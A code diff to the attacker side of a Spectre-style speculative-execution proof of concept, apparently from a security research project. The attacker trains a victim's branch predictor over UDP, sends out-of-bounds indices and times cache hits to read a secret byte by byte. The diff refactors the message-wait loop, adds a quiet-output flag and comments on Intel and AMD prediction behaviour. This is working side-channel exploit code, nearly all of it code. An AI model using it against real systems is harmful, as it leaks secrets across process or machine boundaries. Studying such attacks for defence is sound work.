@@ -68,6 +68,7 @@ uint64_t target_array1_size_va; // VM Address of victim's branch condition
 uint64_t target_va;          // VM Address of target in victim
 
 std::string secret;   // Bucket for stolen secret/s...
+bool verbose_stats = true;  // print out stats for every byte
 
 /* UDP ocket onnection to Victim */
 uint16_t udp_port = 7777;
@@ -246,6 +247,7 @@ inline void gadget_touch_page(SocketUDP& s, size_t x) {
 
 
 // TODO: Currently this is being done by the victim.  Need to rework...
+// - Last real crutch in shared-memory PoC
 inline void gadget_evict_condition(SocketUDP& s) {
   // Send a single request with a malicious request:
   // Initialize target x to send to victim:
@@ -281,16 +283,34 @@ inline void burst_train(SocketUDP& s, size_t training_x = 0) {
 
 
 inline void speculate(SocketUDP& s, size_t malicious_x) {
-  // Send a single request with a malicious request:
   // Initialize target x to send to victim:
   msg m = {};
   m.x = malicious_x;
   m.fn = FN_PROCESS;
 
-  // Send a burst of 5 training (valid) requests:
+  // Send a single malicious (invalid) requests:
   auto bytes = s.send(&m, sizeof(m));
   if ( unlikely(!(bytes > 0)) ) {
     std::cerr << "Failed to send malicious_x!" << std::endl;
+  }
+}
+
+
+inline void wait_for_msg(SocketUDP& s, Request req, size_t x = 0) {
+  uint8_t buf[2048];   // TODO: move this to SocketUDP?
+  msg& m = reinterpret_cast<msg&>(buf);
+  for (;;) {
+    // Wait for confirmation of malicious_x:
+    auto bytes = s.recv(buf, sizeof(buf));  // TODO: Replace me with recvmmsg!
+    if (bytes == sizeof(msg)) {
+      if (m.fn == req && m.x == x) {
+        // Emulates a server error response
+        break;
+      }
+    }
+    else {
+      std::cerr << "Unexpected msg size: " << bytes << std::endl;
+    }
   }
 }
 
@@ -368,13 +388,13 @@ void parse_args(int argc, char* const argv[]) {
 
   int c;
   opterr = 0;
-  while ( (c = getopt(argc, argv, "ht:a:s:l:o:c:p:i:")) > 0) {
+  while ( (c = getopt(argc, argv, "ht:a:s:l:o:c:p:i:q")) > 0) {
     switch (c) {
     case 'h':
       std::cout << argv[0]
           << " {(-o target_x_offset) | (-t target_va]) (-a array1_va)}" \
              " (-l target_bytes) [-c cache_hit_threshold]"\
-             " [-i ipv4_address] [-p udp_port]"
+             " [-i ipv4_address] [-p udp_port] [-q]"
           << std::endl;
       exit(EXIT_SUCCESS);
       break;
@@ -403,6 +423,9 @@ void parse_args(int argc, char* const argv[]) {
       break;
     case 'i': // Send to another IPv4 address (string)
       ipv4_addr = optarg;
+      break;
+    case 'q': // Quiet stat printing to console
+      verbose_stats = false;
       break;
     case '?':
       std::cerr << "Unknown argument: " << opterr << std::endl;
@@ -457,9 +480,11 @@ inline void flush_condition() {
 }
 
 
+/********************************************************************
+UDP socket worker thread.
+********************************************************************/
 void attacker_worker(uint16_t port) {
   // Socket initialization:
-  uint8_t buf[2048];   // TODO: move this to SocketUDP?
   SocketUDP s;
   assert(s.setRemote(ipv4_addr, port) == 0);
   std::cout << "["<<port<<"] - Sender worker thread listening." << std::endl;
@@ -484,7 +509,7 @@ void attacker_worker(uint16_t port) {
 #endif
 
 
-    // Repeat attack 100 times / byte:
+    // Repeat attack m times / byte:
     while (++tries % measurements != 0) {
       const auto attempt = tries-1;
       const size_t training_x = attempt % TRAINING_X_MAX;
@@ -495,28 +520,18 @@ void attacker_worker(uint16_t port) {
       // Send request to victim:
       burst_train(s, training_x); // Critical to trick speculation down wrong path!
       gadget_evict_condition(s);  // Critical to cause speculation while waiting for memory!
+
+      /* BEGIN CRITICAL SECTION */
       speculate(s, malicious_x);
 
       // Measure speculative execution's impact on cache:
       // - measure after a predefined delay (or after event e.g. packet recv.)
       // - TODO: this does not handle dropped packets (i.e. a real external server)
       // -- Linux tends to guarantee in-oder and sucessful delivery for localhost
-      msg& m = reinterpret_cast<msg&>(buf);
-      for (;;) {
-        // Wait for confirmation of malicious_x:
-        auto bytes = s.recv(buf, sizeof(buf));  // TODO: Replace me with recvmmsg!
-        if (bytes == sizeof(msg)) {
-          if (m.fn == FN_PROCESS && m.x == malicious_x) {
-            // Emulates a server error response
-            break;
-          }
-        }
-        else {
-          std::cerr << "Unexpected msg size: " << bytes << std::endl;
-        }
-      }
+      wait_for_msg(s, FN_PROCESS, malicious_x);
 
       measure_sidechannel(attempt);
+      /* END CRITICAL SECTION */
 
 #ifdef DEBUG
       std::cout << "training_x: "<< training_x << std::endl;
@@ -583,8 +598,13 @@ void attacker_worker(uint16_t port) {
     // Is there a majority leader?  (picked signal threshold 2x, out of a hat)
     bool significant = best >= (second/2) && sum >= 64;
     // Suspicious of Intel's Zero-value predicition on minor page fault?
+    // TODO: I suspect a better heuristic would trigger this boolean if
+    //       0 is observed in top 2 positions.  Need to ensure termination...
     bool zero_value_prediciton = (counts_idx[0] == 0) &&
                                  (sum <= 4*MIN_MEASUREMENTS);
+//    bool zero_value_prediciton = (counts_idx[0] == 0) || (counts_idx[1] == 0);
+    // Note: AMD does not appear to do zero-value prediction.
+    // - A low observability on AMD machines could mean TLB entry has been evicted.
 
     // Dynamic confidence adjustment:
     bool confident = single_contender || significant;
@@ -594,21 +614,20 @@ void attacker_worker(uint16_t port) {
       // Force a TLB hit by triggering a touch page gadget:
       // - critical to prevent zero-value prediction!
       auto mode = FN_NULL;
+      auto mode_x = size_t(0);
       if (target_array1_va == 0) {
         gadget_touch_secret(s, secret_idx);
         mode = FN_TOUCH_SECRET;
+        mode_x = secret_idx;
       }
       else {
         gadget_touch_page(s, malicious_x);
         mode = FN_TOUCH_PAGE;
+        mode_x = malicious_x;
       }
 
       // Expect confirmation of gadget from victim (optional):
-      msg& m = reinterpret_cast<msg&>(buf);
-      auto bytes = s.recv(buf, sizeof(buf));
-      if (bytes != sizeof(msg) || m.x != secret_idx || m.fn != mode) {
-        std::cerr << "Unexpected touch confirmation..." << std::endl;
-      }
+      wait_for_msg(s, mode, mode_x);
 
       // Retry, quadruple the number of measurments:
       measurements *= 8;
@@ -625,14 +644,16 @@ void attacker_worker(uint16_t port) {
       // Output statistics:
       float confidence = (float(best) / float(sum)) * 100;
       float observability = (float(best) / measurements) * 100;
-      std::stringstream idx_hex;
-      idx_hex << std::hex << std::setw(2) << idx;
-      std::cout << "Offset["<<malicious_x<<"] (0x" << idx_hex.str() << " : "
-                << static_cast<char>(idx) << "): "
-                << best << '/' << sum << " hits with confidence "
-                << confidence << "%.\n";
-      std::cout << "- Observability: " << observability << "% over "
-                << measurements << " measurements." << std::endl;
+      if (verbose_stats) {
+        std::stringstream idx_hex;
+        idx_hex << std::hex << std::setw(2) << idx;
+        std::cout << "Offset["<<malicious_x<<"] (0x" << idx_hex.str() << " : "
+                  << static_cast<char>(idx) << "): "
+                  << best << '/' << sum << " hits with confidence "
+                  << confidence << "%.\n";
+        std::cout << "- Observability: " << observability << "% over "
+                  << measurements << " measurements." << std::endl;
+      }
 
       // Reset measurements:
       tries = 0;
@@ -650,8 +671,12 @@ void attacker_worker(uint16_t port) {
 
   // Print out secret:
   std::cout << "Finished reading " << target_len
-            << " bytes at offset " << target_x_offset << ":\n"
-            << make_printable(secret) << std::endl;
+            << " bytes at offset " << target_x_offset;
+  if (secret.size() < 1024) {
+    // Print secret to console if relatively small...
+    std::cout << ":\n" << make_printable(secret);
+  }
+  std::cout << std::endl;
 }
 
 
